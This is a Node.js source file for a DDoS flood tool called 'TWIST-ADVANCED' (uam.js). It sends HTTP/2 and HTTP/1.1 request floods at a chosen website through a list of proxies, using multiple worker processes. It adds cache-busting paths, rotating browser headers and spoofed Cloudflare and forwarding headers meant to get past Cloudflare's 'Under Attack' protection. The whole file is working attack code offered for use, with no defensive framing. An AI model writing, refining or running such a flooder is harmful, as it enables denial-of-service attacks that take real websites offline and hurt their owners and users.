const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

process.on('uncaughtException', function (exception) {});
process.on('unhandledRejection', function (er) {});

if (process.argv.length < 5) {
    console.log(`[!] node uam.js <HOST> <TIME> <RPS> <THREADS> [MODE]`);
    console.log(`[!] Modes: 1=Standard, 2=Cache-Bypass, 3=UAM-Bypass, 4=Extreme`);
    process.exit();
}

// ==================== ENHANCED CACHE & UAM BYPASS ====================
class AdvancedBypass {
    constructor(mode = 2) {
        this.mode = mode;
        this.requestCount = 0;
    }

    // Generate path dengan cache miss forced
    generateSmartPath(basePath) {
        let path = basePath || "/";
        
        if (this.mode >= 2) {
            const busters = ['_cb', '_t', '_r', '_cache', 'v', 'ver', 'ts'];
            const buster = busters[Math.floor(Math.random() * busters.length)];
            const separator = path.includes('?') ? '&' : '?';
            path += `${separator}${buster}=${Date.now()}${Math.random().toString(36).substr(2, 8)}`;
        }

        if (this.mode >= 3) {
            // UAM bypass - natural looking paths
            const naturalPaths = ['/home', '/index', '/main', '/api/v1/data', '/wp-json/wp/v2/posts'];
            if (Math.random() > 0.7) {
                path = naturalPaths[Math.floor(Math.random() * naturalPaths.length)];
            }
        }

        if (this.mode >= 4) {
            // Extreme mode - byte manipulation
            path = this.applyByteManipulation(path);
        }

        return path;
    }

    applyByteManipulation(path) {
        if (path.length > 10) {
            const buf = Buffer.from(path);
            const pos = Math.floor(buf.length / 2);
            buf[pos] = (buf[pos] + 1) % 256;
            return buf.toString('utf8');
        }
        return path;
    }

    // Generate headers realistic untuk bypass protection
    generateAdvancedHeaders(host, path) {
        this.requestCount++;
        
        const headers = {
            ':method': 'GET',
            ':path': path,
            ':authority': host,
            ':scheme': 'https',
            
            // Critical headers
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            
            // Security headers
            'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1'
        };

        // User-Agent rotation
        headers['user-agent'] = this.getUserAgent();

        if (this.mode >= 3) {
            // UAM bypass headers
            headers['cf-visitor'] = '{"scheme":"https"}';
            headers['cf-connecting-ip'] = this.generateIP();
            headers['cf-ipcountry'] = 'US';
            headers['dnt'] = '1';
            headers['sec-gpc'] = '1';
        }

        if (this.mode >= 4) {
            // Extreme headers
            headers['x-request-id'] = crypto.randomBytes(8).toString('hex');
            headers['x-forwarded-proto'] = 'https';
            headers['x-real-ip'] = this.generateIP();
        }

        return headers;
    }

    getUserAgent() {
        const agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
        ];
        return agents[Math.floor(Math.random() * agents.length)];
    }

    generateIP() {
        return `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }

    getTLSConfig() {
        const config = {
            ALPNProtocols: ['h2', 'http/1.1'],
            ciphers: [
                "TLS_AES_128_GCM_SHA256",
                "TLS_AES_256_GCM_SHA384", 
                "TLS_CHACHA20_POLY1305_SHA256",
                "ECDHE-ECDSA-AES128-GCM-SHA256",
                "ECDHE-RSA-AES128-GCM-SHA256",
                "ECDHE-ECDSA-AES256-GCM-SHA384", 
                "ECDHE-RSA-AES256-GCM-SHA384"
            ].join(":"),
            sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256",
            ecdhCurve: "X25519:P-256:P-384",
            rejectUnauthorized: false
        };

        if (this.mode >= 3) {
            config.secureOptions = 
                crypto.constants.SSL_OP_NO_SSLv2 |
                crypto.constants.SSL_OP_NO_SSLv3 |
                crypto.constants.SSL_OP_NO_TLSv1 |
                crypto.constants.SSL_OP_NO_TLSv1_1 |
                crypto.constants.ALPN_ENABLED;
        }

        return config;
    }
}

// ==================== UTILITY FUNCTIONS ====================
function readLines(filePath) {
    try {
        return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
    } catch (e) {
        return [];
    }
}

function randomElement(array) {
    return array[Math.floor(Math.random() * array.length)];
}

function randstr(length) {
    return crypto.randomBytes(length).toString('hex').substring(0, length);
}

// ==================== MAIN CONFIGURATION ====================
const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    mode: process.argv[6] ? ~~process.argv[6] : 2
};

const parsedTarget = url.parse(args.target);
const bypassEngine = new AdvancedBypass(args.mode);

// Load resources
const proxies = readLines("proxy.txt");
const userAgents = readLines("ua.txt");

if (cluster.isMaster) {
    console.log(`[TWIST-ADVANCED] Starting attack on: ${parsedTarget.host}`);
    console.log(`[TWIST-ADVANCED] Duration: ${args.time}s | Threads: ${args.threads} | RPS: ${args.Rate}`);
    console.log(`[TWIST-ADVANCED] Mode: ${args.mode} (1=Standard, 2=Cache-Bypass, 3=UAM-Bypass, 4=Extreme)`);
    
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        console.log(`[TWIST-ADVANCED] Attack completed`);
        process.exit(1);
    }, args.time * 1000);
}

// ==================== CONNECTION MANAGER ====================
class TwistSocket {
    constructor() {
        this.connectionPool = new Map();
    }

    createConnection(proxy, target, callback) {
        const proxyParts = proxy.split(':');
        if (proxyParts.length < 2) return callback(null, 'Invalid proxy');

        const proxyOptions = {
            host: proxyParts[0],
            port: ~~proxyParts[1],
            address: `${target.host}:443`,
            timeout: 10
        };

        this.HTTP(proxyOptions, (connection, error) => {
            if (error) return callback(null, error);

            const tlsOptions = bypassEngine.getTLSConfig();
            tlsOptions.socket = connection;
            tlsOptions.servername = target.host;

            const tlsConn = tls.connect(443, target.host, tlsOptions);
            
            tlsConn.on('secureConnect', () => {
                const client = http2.connect(target.href, {
                    createConnection: () => tlsConn,
                    settings: {
                        enablePush: false,
                        initialWindowSize: 65535,
                        maxConcurrentStreams: 1000
                    }
                });

                client.on('error', () => {});
                callback(client, null);
            });

            tlsConn.on('error', (err) => {
                callback(null, err.message);
            });
        });
    }

    HTTP(options, callback) {
        const payload = `CONNECT ${options.address} HTTP/1.1\r\nHost: ${options.address}\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 30000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString();
            if (response.includes("200") || response.includes("Connection established")) {
                return callback(connection, null);
            }
            connection.destroy();
            return callback(null, "Invalid proxy response");
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(null, "Timeout");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(null, error.toString());
        });
    }
}

const twistSocket = new TwistSocket();

// ==================== ATTACK ENGINE ====================
function executeAttack() {
    if (proxies.length === 0) return;

    const proxy = randomElement(proxies);
    
    twistSocket.createConnection(proxy, parsedTarget, (client, error) => {
        if (error) return;

        client.on('connect', () => {
            const attackInterval = setInterval(() => {
                for (let i = 0; i < Math.min(args.Rate, 10); i++) {
                    try {
                        const path = bypassEngine.generateSmartPath(parsedTarget.path);
                        const headers = bypassEngine.generateAdvancedHeaders(parsedTarget.host, path);
                        
                        // Add proxy headers
                        headers['x-forwarded-for'] = proxy.split(':')[0];
                        headers['x-real-ip'] = proxy.split(':')[0];

                        const request = client.request(headers);
                        
                        request.on('response', (responseHeaders) => {
                            const status = responseHeaders[':status'];
                            
                            if (status === '200') {
                                console.log(`[SUCCESS] ${path.substring(0, 30)}...`);
                            }
                            
                            request.close();
                        });

                        request.on('error', () => {});
                        request.setTimeout(5000, () => request.close());
                        request.end();

                    } catch (e) {
                        // Silent catch
                    }
                }
            }, 100);

            setTimeout(() => {
                clearInterval(attackInterval);
                client.destroy();
            }, args.time * 1000 - 1000);
        });

        client.on('error', () => {
            client.destroy();
        });
    });

    // Parallel HTTP/1.1 attack
    executeHTTP1Attack(proxy);
}

function executeHTTP1Attack(proxy) {
    try {
        const proxyParts = proxy.split(':');
        if (proxyParts.length < 2) return;

        const socket = net.connect(~~proxyParts[1], proxyParts[0]);
        
        socket.on('connect', () => {
            const connectPayload = `CONNECT ${parsedTarget.host}:80 HTTP/1.1\r\nHost: ${parsedTarget.host}:80\r\nConnection: Keep-Alive\r\n\r\n`;
            socket.write(connectPayload);
        });

        socket.on('data', (data) => {
            if (data.toString().includes('200')) {
                const path = bypassEngine.generateSmartPath(parsedTarget.path);
                const httpPayload = 
                    `GET ${path} HTTP/1.1\r\n` +
                    `Host: ${parsedTarget.host}\r\n` +
                    `User-Agent: ${bypassEngine.getUserAgent()}\r\n` +
                    `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n` +
                    `Cache-Control: no-cache\r\n` +
                    `Connection: Keep-Alive\r\n\r\n`;

                socket.write(httpPayload);
            }
        });

        socket.setTimeout(5000);
        socket.on('timeout', () => socket.destroy());
        socket.on('error', () => socket.destroy());

    } catch (e) {
        // Silent catch
    }
}

// ==================== START FLOOD ====================
if (!cluster.isMaster) {
    console.log(`[Worker ${process.pid}] Starting in mode ${args.mode}`);
    
    // Start multiple attack loops based on mode
    const intervals = args.mode >= 3 ? 6 : 8;
    const delay = args.mode >= 3 ? 150 : 100;
    
    for (let i = 0; i < intervals; i++) {
        setInterval(executeAttack, delay);
    }

    // Additional aggressive attacks for extreme mode
    if (args.mode >= 4) {
        for (let i = 0; i < 4; i++) {
            setInterval(executeAttack, 50);
        }
    }
}

// Clean exit
setTimeout(() => process.exit(1), args.time * 1000);